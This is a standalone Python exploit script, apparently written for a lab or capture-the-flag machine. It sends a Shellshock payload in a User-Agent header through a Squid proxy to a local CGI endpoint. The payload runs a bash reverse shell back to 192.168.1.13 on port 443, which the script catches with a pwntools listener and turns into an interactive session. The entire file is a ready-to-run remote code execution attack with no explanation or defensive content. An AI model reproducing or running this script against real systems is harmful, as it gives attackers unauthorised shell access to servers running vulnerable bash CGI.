import sys, signal, requests, threading
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Quitting...")
    sys.exit(1)

# ctrl + c
signal.signal(signal.SIGINT, def_handler)

main_url = "http://127.0.0.1/cgi-bin/status"
squid_proxy = {'http': 'http://192.168.1.10:3128'}
lport = 443

def shell_shock():
    headers = {'User-Agent':"() { :; }; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.13/443 0>&1'"}
    r = requests.get(main_url, headers=headers, proxies=squid_proxy)

if __name__ == '__main__':
    try:
        threading.Thread(target=shell_shock, args=()).start()
    except Exception as e:
        log.error(str(e))
    
    shell = listen(lport, timeout=15).wait_for_connection()

    if shell.sock is None:
        log.failure("\n[!]Cant stablish connection")
        sys.exit(1)
    else:
        shell.interactive()

